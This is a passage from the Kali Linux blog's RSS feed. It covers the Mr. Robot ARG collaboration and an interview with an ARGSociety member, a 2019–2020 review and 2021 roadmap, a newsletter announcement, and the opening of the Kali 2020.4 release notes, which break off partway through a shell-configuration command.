Afterwards give Empire a try <em>if you&rsquo;re <a href="https://www.kali.org/get-kali/">using Kali Linux</a>!</em></p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt update +--(kali?kali)-[~] +-$ sudo apt install -y powershell-empire starkiller +--(kali?kali)-[~] +-$ sudo powershell-empire </code></pre></description>
</item>
<item>
<title>Kali Linux + Mr. Robot ARG Society</title>
<link>https://www.kali.org/blog/mr-robot-arg-society/</link>
<guid isPermaLink="true">https://www.kali.org/blog/mr-robot-arg-society/</guid>
<pubDate>Tue, 29 Dec 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/mr-robot-arg-society/images/kali-mr-robot-augmented-reality-game-1.jpg" type="image/jpg"/>
<description><p>Many of you may have known about the show <a href="https://www.usanetwork.com/mr-robot">Mr Robot</a> and its unique connection to Kali Linux. But there is a little bit more that we have not talked about due to NDAs. But it appears the mystery is over, the red tape has been removed, and we now wanted to take a moment to share it with everyone.</p> <p>We had a relationship with Mr Robot, which started during the filming of the 2nd season. While the 1st season was running, we were approached at BlackHat 2015 to give our permission to use Kali in the show. We worked out the legal parts of things (it&rsquo;s legal to use Kali in media, we don&rsquo;t care, but studios want that in writing), and starting in the 2nd season from time to time the production staff would reach out to us to ask us questions, have us provide them graphics, provide them with specific versions of Kali that were public on specific dates, and similar to keep the show accurate. We were very impressed with the efforts to keep the show grounded while still carrying on a strong hacking focused narrative.</p> <p>Mr Robot has an &ldquo;Alternative Reality Game (ARG)&rdquo; that has been part of the show from the <a href="https://wiki.gamedetectives.net/index.php?title=Mr._Robot_ARG">start</a>. The idea is that as you watch the show, you watch for clues and the clues from the show go into the game and you solve puzzles etc. The production staff wanted us to be part of this ARG and help them on their final step of the puzzle to be tied into the last episode. The final episode aired December 2019, but the puzzle was only recently finally solved.</p> <p>You can read the gory details of the <a href="https://www.reddit.com/r/ARGsociety/wiki/index#wiki_post_season_4_.2F_series">final answer</a> if you are interested. The idea was, we would do a commit to the Kali Git repository that would include a number of items, but also have a surprise. The commit we made was the initial commit of the &ldquo;<a href="https://gitlab.com/kalilinux/packages/kali-legacy-wallpapers">Legacy Wallpapers</a>&rdquo; where we took the <a href="https://www.kali.org/docs/introduction/kali-linux-history/">old Kali</a> and <a href="https://www.backtrack-linux.org/">BackTrack</a> wallpapers and made them available to everyone. However, <a href="https://gitlab.com/kalilinux/packages/kali-legacy-wallpapers/blob/kali/master/kali-1.1/kali-1.1-1280x1024.jpg/">embedded in one of the images</a> was a steganographic message which was a private SSH key. This is the same background image that was used throughout the show&rsquo;s filming.</p> <p>With a password, the SSH key could be extracted from that image. Then with that, players of the ARG could use it to connect to a &ldquo;final target&rdquo;.</p> <p>How would anyone find that one graphic? The clues in the ARG that lead them to it included a call out to &ldquo;OffSec&rdquo;, the Kali GitLab group ID, the project ID for the Legacy Wallpapers, and the specific commit where we had uploaded the special wallpaper.</p> <p>Now the mystery is over, the final problem is solved, and the last door on Mr Robot is finally closed. It was awesome being even a small part of the show, and we loved the respect that the show paid to keeping everything based in reality.</p> <p>Goodbye friend.</p> <h4 id="mr-robot-arg-society">Mr. Robot ARG Society</h4> <p>Any show would be nothing without an audience to watch it. Mr Robot is no exception, and after millions of people watched it, communities started to formed (either online or in person). People would discuss previous episodes, predict theories of where the show was going to go, and have watching parties. Its not un-common for shows to have &ldquo;Easter eggs&rdquo; embedded in them (these can be are little gems hidden in plain sight, which may give a &ldquo;head nod&rdquo; to something, or a spoiler for a up coming event). They are hunted after by people, and adds another level of excitement to re-watch a show. Mr Robot has plenty of them. But where Mr Robot is unique to any other show out, there is <em>(for the time being)</em> an various online elements which links beautifully back into the show. In a sense, these are mini &ldquo;spin offs&rdquo; to the show, allowing for people to go further, get interactive and solve challenges in the Mr Robot universe. One <em>(of a few)</em> domains is &ldquo;<a href="https://www.whoismrrobot.com/">Who Is Mr Robot</a>&rdquo;, which is where there was a lot of focus to solve its challenge(<strong>s</strong>). This was made up of a collection of virtual terminals all from the show, which has a series of technical challenges to solve.</p> <p>There were multiple groups of people working towards <em>(either group of friends doing it privately, or people who started out to be strangers coming together doing it publicly)</em>, a lot of people started trying to answer, but not many made it all the way to the end of Season 4. Finally after over a year of trying, someone got the final part, ARGSociety. We want to reach out and get their view of the show &amp; challenges. We found their <a href="https://www.reddit.com/r/ARGsociety/">subreddit</a> and later joined their <a href="https://discord.com/invite/2ERCJa2">discord</a>. It was immediately apparent how close of a community these people are, not only how active but how passionate they are about the show (and still are). People didn&rsquo;t know each other before joining, but they were all welcoming, humble, and they all had a part to play in solving the puzzle. After chatting to everyone one of the members, <a href="https://twitter.com/B4815162342K">@BK</a>, was selected to be in interviewed on behalf of everyone in the group.</p> <hr> <p><strong>Q.) Why the show Mr Robot?</strong></p> <blockquote> <p>Mr Robot shouted out to the world: I am here now, and &ldquo;your democracy has been hacked&rdquo;. The premise was enough to make me curious. Myself and the other leaders of this crazy community (Carnage Beam and Risk), had no clue what any of us were about to get into.</p> </blockquote> <p><strong>Q.) Did you start watching it from the start?</strong></p> <blockquote> <p>I hadn&rsquo;t even seen so much as a trailer for this show when I started it. Aside from a poster of this dude in a hoodie, I went in blind. But USA network allowed the pilot episode to be viewed about a month or so earlier than its on air premiere date. So by the time the pilot had aired, I think I had already rewatched that single episode 4 or 5 times.</p> </blockquote> <p><strong>Q.) What was your favorite season from the TV show?</strong></p> <blockquote> <p>Picking a favorite season of Mr Robot is like trying to pick a favorite family member. I love them all in their own unique ways.</p> <p>Season 1 offered us a hacking adventure show, almost fit with our very own &ldquo;hack of the week&rdquo; (usually a procedural trope I mostly loath). And as someone who wasn&rsquo;t familiar with the hacking world, I walked into Mr Robot season 1 as an undergrad and by episode 10, I felt like I had my degree. At the same time it became evident as each episode aired, that this was so much more than a hack of the week show. It was the character driven drama that kept me week to week.</p> <p>Season 2 became a mirror into the soul; Elliot&rsquo;s soul, and ours. It was slower paced, and with Elliot unable to hack for about half the season, Esmail was able to take deep dives into his characters&rsquo; minds. Season 2 was polarizing, but for those that stuck with it, perhaps the most rewarding.</p> <p>Season 3 became this high octane combination of season 1 and 2. We stood and watched as we got hacks, evil antagonists with master plans, all the tears, and most importantly, we got deeper into the psychology of Elliot Alderson. As Elliot hacked his way through season 3, we learned more and more about who this Elliot guy really was.</p> <p>Then Sam delivered season 4. Fulfilling a show long promise that we the audience would finally understand the &ldquo;whys&rdquo; for everything that had transpired on the show.</p> <p>How could I ever pick one member of the family over another?</p> </blockquote> <p><strong>Q.) Did you watch the show by yourself or with people in the same room or virtually?</strong></p> <blockquote> <p>I had broken my foot and was subsequently dumped that same summer Mr Robot first aired. So for season 1, I was watching alone in a bed with my leg in a boot (I honestly think Sam Esmail would agree this method of watching helped me live inside Elliot&rsquo;s brain a bit more). At the time, I browsed Reddit for other shows I watched like &ldquo;The Leftovers&rdquo; or &ldquo;LOST&rdquo;. And I found the Mr Robot subreddit sometime in the middle of that summer. It&rsquo;s where I first learned people were catching background items in the show that I had seen as well and trying to group think just what those items may mean overall. I was hooked.</p> </blockquote> <p><strong>Q.) Hacking is such a boring thing to watch, how did the shot make it interesting to you?</strong></p> <blockquote> <p>This, I thought, would be the easiest question to answer. Because I do represent that part of the audience that has NO CLUE how to hack. It&rsquo;s foreign to me in every way. Yet there I was week after week, trying to understand more and more of just how Elliot could pull some of these hacks off. There are three different types of viewers out there: Those who can hack, those who cant but understand what&rsquo;s going on, and those who don&rsquo;t know how to use hotkeys. I was the latter. I think the most important thing Esmail did for the hacking world and how it is represented on TV was&ndash;he didn&rsquo;t sugar coat anything. He showed us EXACTLY what hacking was. No TRON city file directories in this show. He didn&rsquo;t need to spice up or dumb down what hacking was to deliver it to his audience&ndash;no need. The respect he showed carried over to me as an ignorant audience member.</p> </blockquote> <p><strong>Q.) What&rsquo;s your favorite hack from the show?</strong></p> <blockquote> <p>My favorite hack was one of the more simple in all of the show&rsquo;s hacks (rich coming from someone who cant hack to call anything done in this show simple). There&rsquo;s a moment at the end of season 1 (I won&rsquo;t spoil it in case some people have been living under a rock) where Elliot needs to hack a blank CD with audio files. This rudimentary hack was shot beautifully with Rami&rsquo;s amazing acting center stage. Then the music kicks into high gear as we are with Elliot in the moment. He cried&ndash;we all cried. It was this moment near the end of season 1&ndash;I realized this show was gonna change things about TV.</p> </blockquote> <p><strong>Q.) Would you call yourself a hacker (pre or post show)? What do you do for your day job?</strong></p> <blockquote> <p>I would not call myself a hacker. I think every single person in the Mr Robot ARG community would attest that I was the quintessential non-hacker of the community. Carnage Beam and Risk on the other hand were our experts, in addition to being part of the leadership team.</p> <p>When the show started I was still in professional sports advertising. By the time the show ended, I moved back to Los Angeles to be a writer.</p> </blockquote> <p><strong>Q.) Had you used Kali Linux before?</strong></p> <blockquote> <p>I hadn&rsquo;t so much as heard of Kali Linux, let alone used it prior to Mr Robot.</p> </blockquote> <p><strong>Q.) What did you think of the ending?</strong></p> <blockquote> <p>This is like kicking a hornet&rsquo;s nest. I loved the ending. I hated the ending. And then I loved it all over again. Endings are damn near impossible these days. Writing a mystery? Groupthink from Reddit most likely already figured it out 8 episodes ago. Writing an epic adventure? Better not have one of your big bads die with a glass of wine in their hand staring off in the distance. What Sam did in the final season was almost take the onus off the &ldquo;ending&rdquo;. He gave us answers throughout that final season, allowing us to just enjoy the final chapter of the story as best we could knowing it was all coming to an end.</p> <p>Something the end of Mr robot captured was spirit. As Elliot&rsquo;s journey was ending, ours was too. Despite all the crazy hacks, storylines and complex problems Elliot got himself into, most of all we all just wanted to see this crazy hacker find peace. I think Sam accomplished that with flying colors.</p> </blockquote> <p><strong>Q.) How many times have you seen the show now?</strong></p> <blockquote> <p>Well you&rsquo;re talking to a member of ARGsociety. I think the average member has rewatched each season at least 2 or 3 times. Personally I have seen each season anywhere from 15-20 times. I am a theorizer. A graduate with a PhD from the theory school of LOST. If the show really has meat on the bones, you&rsquo;ll find yourself learning or catching something new each watch.</p> <p>Now add in the puzzles. Scanning episodes over and over and over again, scrupulously looking for easter eggs or QR codes. Or looking for that one item Sam placed in the background to be found only upon a rewatch.</p> </blockquote> <p><strong>Q.) Aware of any other easter eggs in the show?</strong></p> <blockquote> <p>Well, that was the beauty of this show. It demanded we look at, and question, everything. And that&rsquo;s exactly what we did. The line blurred so much it was hard to tell what was an actual easter egg and what wasn&rsquo;t.</p> <p>Fun fact, Sam said there&rsquo;s still an easter egg or two to be found from the show. Granted we may have already found whatever he&rsquo;s talking about, or maybe not&hellip; but I think there will always be a mystery or two left to be solved in Mr Robot.</p> </blockquote> <p><strong>Q.) When did you start to partake in solving the puzzle (WHoIsMrRobot.com)?</strong></p> <blockquote> <p>After the CD hack at the end of season 1. Seeing as I wasn&rsquo;t a hacker, I wasn&rsquo;t sure what it was I was actually seeing on screen in terms of interactive ARG material. It took watching Elliot do something as innocuous as the CD hack for me to wonder &ldquo;hey what was that password he used? Am I supposed to figure it out?&rdquo; I jumped on Reddit and found our group, ARGsociety, still in its infancy. Leading me to the infamous wimr (whoismrrobot.com).</p> </blockquote> <p><strong>Q.) Can you explain what it was like when you solved any part of the challenges?</strong></p> <blockquote> <p>If I pretended to answer this like I myself solved any part of the puzzle, our community of thousands would collectively laugh their butt off. I helped when I could, but most of our solves were figured out together. We painstakingly would discuss what and where answers could be found. Fellow leadership would try and explain the fundamentals of different ciphers and how to spot them, in an effort to advance in the game. But this group of puzzle solvers was never satisfied until we beat each season as a whole. We never celebrated (or slept) until every single puzzle was solved and the story for that season&rsquo;s ARG was complete.</p> </blockquote> <p><strong>Q.) What was your favorite part of the interactive puzzle?</strong></p> <blockquote> <p>Personally for me, it was the world blending. According to the show we, the audience, were inside the mind of Elliot. The interactive ARG websites helped cement that notion. It felt like we were really living in Elliot&rsquo;s universe with every URL or QR code we would find.</p> </blockquote> <p><strong>Q.) Would you partake in solving another show&rsquo;s interactive puzzle?</strong></p> <blockquote> <p>I would in principle. However it would need the perfect blend that Mr Robot provided. There&rsquo;s a fine line between marketing material, simple interactive game, and world blending ARG. Other shows have tried to pass off superfluous marketing material as some kind of makeshift ARG and they&rsquo;d lose me, Carnage, Beam, and Risk off the bat. In fact that kind of laziness in the world building would make me stop watching the show altogether. A few shows can get it half right and really do put time and effort into their ARG&ndash;but there&rsquo;s no world blending. It just feels like you&rsquo;re solving a game that has no bearing on the actual substance of the show you&rsquo;re watching. Mr Robot captured the exact right amount of magic to make their ARG blossom.</p> </blockquote> <p><strong>Q.) What advice would you give to a TV show/movie producer who is wanting to create an interactive &ldquo;puzzle&rdquo;?</strong></p> <blockquote> <p>Almost a see above answer here. I would repeat what I heard Sam Esmail say about his ARG: &ldquo;If we&rsquo;re gonna do this&ndash;we do it 100%&rdquo;. Don&rsquo;t half ass it. There is a unique opportunity for show creators and producers by developing an ARG world, one that I think a lot have shied away from.</p> <p>On that token, I would also say Esmail could have done even more. To be clear: he gave us this game and we couldn&rsquo;t be more grateful. He melded us into his universe with precision&ndash;he knowingly or unknowingly created a community of die hard fans for life. Ones that were hopping back to Amazon prime to rewatch an episode because they&rsquo;re looking for 2 more digits to an IP address they missed. It doesn&rsquo;t take a genius to know what that can mean for view counts, strategic advertising, and word of mouth. But by the end of the show, we kind of did feel left out in the dust a bit. 1000s of hours were invested into his universe, and I dare say we would all do it again in a heartbeat. But it felt like we were pen pals waiting for a letter that never came. This isn&rsquo;t a slight against Sam or the larger audience as a whole. But there was only one group of a few thousand people walking, talking, sleeping, and breathing Mr Robot&ndash;that was ARGsociety. I know that when I write a TV show, those are the fans I&rsquo;ll be giving back to the most.</p> </blockquote> <p><strong>Q.) What are you going to do now? After rewatching the show another time that is!</strong></p> <blockquote> <p>I&rsquo;m going to continue to write my ass off until I feel like I somehow know what I am doing. Kind of like how I handled hacking and the ARG for Mr Robot! Then the next step is figuring out how to incorporate an ARG of my own into a show I have cooking up.</p> </blockquote> <p><strong>Q.) At what stage did you create the community?</strong></p> <blockquote> <p>We began as a subreddit. I joined leadership at that stage&ndash;right around the start of 2017. We also had an IRC where we would try and chat in real time but it was never too effective in communication. We hit about 3 or 4 thousand members on the Reddit (most of which active) before we ballooned, prior to season 3. Each seasons&rsquo; ARG came with a prize. And the prize for solving season 2&ndash;was that your name would be put into the show on one of the many hacking screens we see. Some of us were lucky enough to be included in the Mr Robot universe for life&ndash;a prize no one can ever take away. A true honor. So once word of this very interactive prize spread&ndash;our numbers ballooned.</p> <p>It was there we decided to move our puzzle solving from the post/reply world of Reddit to the real time organized conversation style of Discord. I&rsquo;m a millennial in my mid 30s. Discord reminded me of the old school AOL chat rooms&ndash;and it felt like the perfect platform to solve ARGs with. As a leader of the community&ndash;I felt the move to discord would not only strengthen our puzzle solving abilities, but also allow the Mr Robot community as a whole, a place to meet and actually get to know one another.</p> <p>Both our Reddit and discord have continued to grow beyond the show&rsquo;s end. Between the two we have roughly 10,000 or so members.</p> </blockquote> <p><strong>Q.) Would you say the people here are now good friends, keep in touch, friends for life?</strong>|</p> <blockquote> <p>I&rsquo;d say that varies with every member in the group, right? Lots of our numbers lurk in the background&ndash;yet keep an active status in the discord server. People come and go with discord servers all the time. Yet in ours, it seems people like to stay. Even some of the ARG team that developed the game itself, have become members of the community.</p> <p>Those of us active every day, are friends for life. I don&rsquo;t see anyone going anywhere anytime soon. We have people from all walks of life on that server. I don&rsquo;t travel to other discord servers all too much, but I have to imagine we have one of the most inclusive servers in all of the internet. We have members on every continent, speaking 24 hours a day. Cis, trans, nerds, jocks, hackers, jokesters, drinkers, smokers, midnight tokers. Not only are we friends, but in this new COVID world we might even be the future.</p> </blockquote> <p><strong>Q.) We like to give credit where its due. Who helped you?</strong></p> <blockquote> <p>Hmm, it was largely a group effort. Some key solvers&ndash;and by key I mean, without them, we might still be stuck on those puzzles they solved, even today&hellip; were @obafgkm, @cr4mb0, <a href="https://twitter.com/SteveRipple">@RipVanWinkle</a>, @PunkAB, and <a href="https://twitter.com/bogie">@Bogie</a> among others. <a href="https://www.reddit.com/user/willdroid8">@Willvoid</a> did stellar work keeping the ARG map/timeline updated with every solve we made. Allowing new members easy access to catching up with where we presently were in the game. Every active member had a role in solving the ARG. Even down to those who just reminded us to focus when we were going off the rails. The names are too many to list.</p> </blockquote> <p><strong>Q.) Anything else you would like to add?</strong></p> <blockquote> <p>I&rsquo;d like to add that we as a community are ready for the next big ARG. The marvelous team at 5th column, and the work done behind the scenes by people we will never know about (but would have liked to), together led to a well deserved EMMY for best ARG in 2020. Frankly no other ARG came close to what the Mr Robot ARG has been year after year. I was glad to see the win come for them.</p> <p>We&rsquo;re ready for the future. But we&rsquo;re gonna wait for the next show that deserves us.</p> </blockquote> <hr> <p>From everyone on the Kali team, well done ARGSociety! It looks like you guys haven&rsquo;t yet stop, and are hunting to the other Easter eggs still left to be found! If you want to know more, get involved, join their <a href="https://www.reddit.com/r/ARGsociety/">subreddit</a> and <a href="https://discord.com/invite/2ERCJa2">discord</a>.</p> <p>We will leave you now with a video by <a href="https://twitter.com/dafreqs">@Beamofoldlight</a> from ARGSociety in his down time put together this of them completing the <a href="https://www.reddit.com/r/ARGsociety/wiki/index">final puzzle</a>, which really shows just <a href="https://i.redd.it/enyq8z3ma6i51.jpg">how much effort</a> went into <a href="https://www.reddit.com/r/ARGsociety/wiki/welcome">solving</a> it <a href="https://cdn.discordapp.com/attachments/581200568983355394/715015582197743636/arg-timeline-s4.pdf">all</a>. Enjoy.</p> <video class="video-shortcode" preload="metadata" controls> <source src="https://www.kali.org/blog/mr-robot-arg-society/videos/S4.mp4" > Your browser does not support the video tag. </video></description>
</item>
<item>
<title>The last 12 Months (2019/2020) & Looking Forwards (2021)</title>
<link>https://www.kali.org/blog/2019-2020-review-onwards-with-2021/</link>
<guid isPermaLink="true">https://www.kali.org/blog/2019-2020-review-onwards-with-2021/</guid>
<pubDate>Tue, 22 Dec 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/2019-2020-review-onwards-with-2021/images/kali-last-12-months-2020.jpg" type="image/jpg"/>
<description><p>As the end of the year is coming up <em>(some may say not quickly enough)</em>, we want to take a few minutes and recap on our <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">roadmap 2019/2020 post</a>.</p> <p>At a higher level, the last 12 months of Kali Linux <em>(outside of the normal release items - e.g. packages updates)</em>, Kali has had various refreshes, switches and additional new features added.</p> <p>Looking a little deeper:</p> <ul> <li>There has been a lot of <strong>graphical &amp; visual changes</strong> (e.g. desktop environments &amp; shells refreshes)</li> <li>With a few &ldquo;under-the-hood&rdquo; <strong>core system changes</strong> (e.g. switching to non-root &amp; default shell)</li> <li>With a sprinkle of <strong>end-user experience</strong> improvements (e.g. new system images &amp; message at login)</li> <li>We have also been altering and tweaking the <strong>back end infrastructure</strong> <em>(just not been talking about it publicly in release notes)</em></li> <li>We have also introduced various <strong>new features</strong> (e.g Kali-undercover &amp; Win-KeX)</li> <li>Added support for <strong>new platforms</strong> &amp; improved current ones (e.g. Vagrant, AWS, ARM &amp; NetHunter)</li> <li><em>We understand not everyone has liked the Python 2 tool removal, but it was necessary and did to help <strong>future proof Kali</strong>. We know this is a painful process, deep change like this always is. But it will only get easier as time goes by and more tools update</em></li> </ul> <p>Breaking it down on a per Kali release, the <strong>feature highlights</strong> from each release:</p> <ul> <li> <p><a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Kali 2019.4</a> (November 2019)</p> <ul> <li>Switching to Xfce for default desktop environment</li> <li>Xfce desktop environment refresh</li> <li>Git-powered Kali-docs</li> <li>Introducing Kali-Undercover + NetHunter-KeX</li> </ul> </li> <li> <p><a href="https://www.kali.org/blog/kali-linux-2020-1-release/">Kali 2020.1</a> (February 2020)</p> <ul> <li>Switching to non-root user</li> <li>Gnome desktop environment refresh</li> <li>Switch to single setup image</li> <li>Start of removing Python 2 tools</li> <li>Introducing NetHunter Rootless edition</li> </ul> </li> <li> <p><a href="https://www.kali.org/blog/kali-linux-2020-2-release/">Kali 2020.2</a> (May 2020)</p> <ul> <li>KDE Plasma desktop environment refresh</li> <li>Introducing LXC / LXD images</li> <li>NetHunter improvements to WiFi (in-built monitoring &amp; injection)</li> <li>Introducing NetHunter USB Arsenal</li> <li>Introducing NetHunter Kernel-Builder</li> </ul> </li> <li> <p><a href="https://www.kali.org/blog/kali-linux-2020-3-release/">Kali 2020.3</a> (August 2020)</p> <ul> <li>ZSH shell refresh</li> <li>Introducing Win-KeX</li> <li>Improving HiDPI support</li> <li>Kali icon refresh</li> <li>Kali setup improvements</li> <li>Introducing NetHunter Bluetooth Arsenal</li> </ul> </li> <li> <p><a href="https://www.kali.org/blog/kali-linux-2020-4-release/">Kali 2020.4</a> (November 2020)</p> <ul> <li>Switching to ZSH as default shell</li> <li>Bash shell refresh</li> <li>Messages at Login</li> <li>Kali AWS image refresh</li> <li>Support for VMware Vagrant</li> <li>Support for Win-KeX on ARM</li> <li>Removed Python 2 tools</li> <li>NetHunter settings menu (Backup/restore + boot menu)</li> </ul> </li> </ul> <p>It goes without saying, that over the year we have updated countless amount of tools, as well as introduced 120 new ones. We also added more support for ARM &amp; <a href="https://nethunter.kali.org/kernel-stats.html">NetHunter devices</a>. ARM we have a new 3 <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build scripts</a> and 1 new <a href="https://www.kali.org/get-kali/#kali-arm">pre-generated images</a>. With Kali NetHunter we have:</p> <ul> <li><a href="https://nethunter.kali.org/images.html">13</a> new <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-devices">devices</a> (25% more)</li> <li><a href="https://nethunter.kali.org/kernels.html">20</a> new <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel">kernels</a> (14% more)</li> <li>9 new <a href="https://www.kali.org/get-kali/#kali-mobile">pre-generated images</a> plus 2 generic images (50% more)</li> </ul> <p>That&rsquo;s looking back on 2019 &amp; 2020. But what does it look like looking forward to 2021?</p> <ul> <li>2019/2020 was a focus on the interface of Kali. 2021 is going to be more tool focused</li> <li>The only thing we didn&rsquo;t manage was to port over kali.org/tools/ to markdown - so that&rsquo;s still on the cards</li> <li>Speaking of websites, we are going to be giving our website a face lift</li> <li>The release of &ldquo;Kaboxer&rdquo; - a project we have been working on for the last 18 months</li> <li>We are hoping to do an online event, aiming for August - more details about that in Kali 2021.2</li> <li>Giving a make over to the community support (forums and real time chat)</li> <li>Improving the bug tracker</li> </ul> <p>We hope to get to as many of those items as we can, as well as a few other things that we have up our sleeves. With that all said, see you for Kali 2021.1, which we are planning on <a href="https://www.kali.org/releases/">releasing</a> a little later next year <em>(currently penciled in for a Tuesday in February 2021)</em>.</p></description>
</item>
<item>
<title>Announcing Kali Linux Newsletter + Keeping in Touch</title>
<link>https://www.kali.org/blog/kali-linux-newsletter-keeping-in-touch/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-newsletter-keeping-in-touch/</guid>
<pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-newsletter-keeping-in-touch/images/kali-newsletter-1.jpg" type="image/jpg"/>
<description><p>Extra! Extra! Read all about it! Today we are announcing the Kali Linux newsletter.</p> <p>It&rsquo;s easy to miss certain news. Not everyone is regularly checking our web page to see if something has been posted <em>(and we don&rsquo;t have a regular schedule of when we update)</em>. It is easy to be drowned out in social networks with everything else going on. And RSS feeds have not been as common as they once were. So to try and help keep you in the loop with Kali Linux, we now have a newsletter option.</p> <p>The contents of the newsletter will mirror <a href="https://www.kali.org/blog/">our blog posts</a> <em>(we are not trying to market or sell anything to you)</em>. Once a day, if there has been any new posts, we will now send a copy direct to your inbox.</p> <p>If you want to, please sign up to the <a href="https://www.kali.org/newsletter/">Kali Linux newsletter</a>.</p> <p>Stay tuned, as we are going to keep working on other ways to improve our communication and community interaction in 2021!</p> <hr> <p><strong>How can you keep up-to-date with what&rsquo;s going on with Kali Linux?</strong> Take your pick! There are various different offerings:</p> <p>For pure content:</p> <ul> <li>Check <a href="https://www.kali.org/blog/">Kali Linux blog</a></li> <li>Watch <a href="https://www.kali.org/rss.xml">Kali Linux RSS feed</a></li> <li>Subscribe to the <a href="https://www.kali.org/newsletter/">Kali Linux newsletter</a></li> </ul> <p>We are on a few social networks too (there will be other infosec related items shared):</p> <ul> <li>Follow <a href="https://twitter.com/kalilinux">Kali Linux Twitter</a></li> </ul> <p>If you are wanting to keep up-to-date with Kali&rsquo;s packages:</p> <ul> <li>You can register at <a href="https://pkg.kali.org/">Kali Linux Package Tracker</a> and then select which ones you want to be alerted when they update.</li> </ul> <p>And if you think something is down, which should be working on our end:</p> <ul> <li>You can discover the answer on the <a href="https://status.kali.org/">Kali Linux status page</a></li> </ul></description>
</item>
<item>
<title>Kali Linux 2020.4 Release (ZSH, Bash, CME, MOTD, AWS, Docs, Win-KeX & Vagrant)</title>
<link>https://www.kali.org/blog/kali-linux-2020-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2020-4-release/</guid>
<pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2020-4-release/images/kali-2020.4-release.jpg" type="image/jpg"/>
<description><p>We find ourselves in the 4th quarter of 2020, and we are ecstatic to announce the release of <strong>Kali Linux 2020.4</strong>, which is ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a>.</p> <p>What&rsquo;s different with this release since <a href="https://www.kali.org/blog/kali-linux-2020-3-release/">2020.3 in August 2020</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#zsh-shell-by-default">ZSH is the new default shell</a></strong> - We said it was happening last time, Now it has. ZSH. Is. Now. Default.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#bash-shell-makeover">Bash shell makeover</a></strong> - It may not function like ZSH, but now Bash looks like ZSH.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#partnership-with-tools-authors-byt3bl33d3rs-crackmapexec-cme">Partnership with tools authors</a></strong> - We are teaming up with <a href="https://twitter.com/byt3bl33d3r">byt3bl33d3r</a>.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#message-at-login">Message at login</a></strong> - Proactively pointing users to resources.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#aws-ec2-cloud-image-refresh">AWS image refresh</a></strong> - Now on GovCloud. Includes Kali&rsquo;s default (command line) tools again. And there is a new URL.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#kali-docs--packaging-guides">Packaging guides</a></strong> - Want to start getting your tool inside of Kali? This should help.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#new-tools--updates">New tools &amp; updates</a></strong> - New Kernel and various new tools and updates for existing ones, as well as setting Proxychains 4 as default.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#kali-nethunter">NetHunter updates</a></strong> - New NetHunter settings menu, select from different boot animations, and persistent Magisk.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#win-kex-25">Win-KeX 2.5</a></strong> - New &ldquo;Enhanced Session Mode&rdquo; brings Win-KeX to ARM devices.</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-4-release/#kali-vagrant--vmware">Vagrant &amp; VMware</a></strong> - We now support VMware users who use Vagrant.</li> </ul> <hr> <h2 id="zsh-shell-by-default">ZSH Shell By Default</h2> <p>In our <a href="https://www.kali.org/blog/kali-linux-2020-3-release/">previous quarterly release, 2020.3</a>, we gave a heads up that we will be <strong>switching from Bash to ZSH as our default shell going forwards</strong> <em>(where possible)</em>. We are happy to announce that after testing and feedback from users, the switch <strong>has now happened</strong>. Say hello to ZSH:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;Hello World. I'm $0&quot; Hello World. I'm zsh +--(kali?kali)-[~] +-$ </code></pre> <p>Thank you to everyone who provided positive and constructive feedback. We are happy with it, and hope you are too. With that said, we know we cannot please everyone with it <em>(so if you wish to revert back to Bash, please do: <code>chsh -s /bin/bash</code>)</em>.</p> <p>ZSH will be the default shell on our <a href="https://www.kali.org/docs/installation/">desktop images</a> (amd64/i386), and <a href="https://www.kali.org/docs/cloud/">cloud</a>. For the time being, other platforms (e.g. <a href="https://www.kali.org/docs/arm/">ARM</a>, <a href="https://www.kali.org/docs/containers/">containers</a>, <a href="https://www.kali.org/docs/nethunter/">NetHunter</a>, <a href="https://www.kali.org/docs/wsl/">WSL</a>/) will still use Bash. We hope to switch more over in later versions. If you use <code>adduser</code>, regardless of the platform, it will also default to Bash for the time being <em>(to avoid some edge cases of items breaking)</em>. In time, this will be changed as well.</p> <p><strong>How do I get it?</strong> Good question! If you:</p> <ul> <li>Do a fresh install of Kali Linux 2020.4 or later, it will &ldquo;just happen&rdquo; during the setup.</li> <li>If you are <a href="https://www.kali.org/docs/general-use/updating-kali/">updating Kali</a>, you will need to switch each user to ZSH (e.g. non-root &amp; root since Kali Linux does not use the root account since <a href="https://www.kali.org/blog/kali-linux-2020-1-release/">2020.1</a>/).</li> </ul> <p><strong>I need to switch. How do I?</strong> This can be done by applying our default <code>zshrc</code> file. If you are not already using ZSH, you can simply copy it over. If you are, you will need to overwrite (make sure to backup first):</p> <pre><code class="language-console">kali@kali:~$ [ -e ~/.zshrc ] &amp;&amp; cp -i ~/.zshrc{,.bak} kali@kali:~$ kali@kali:~$ cp -i 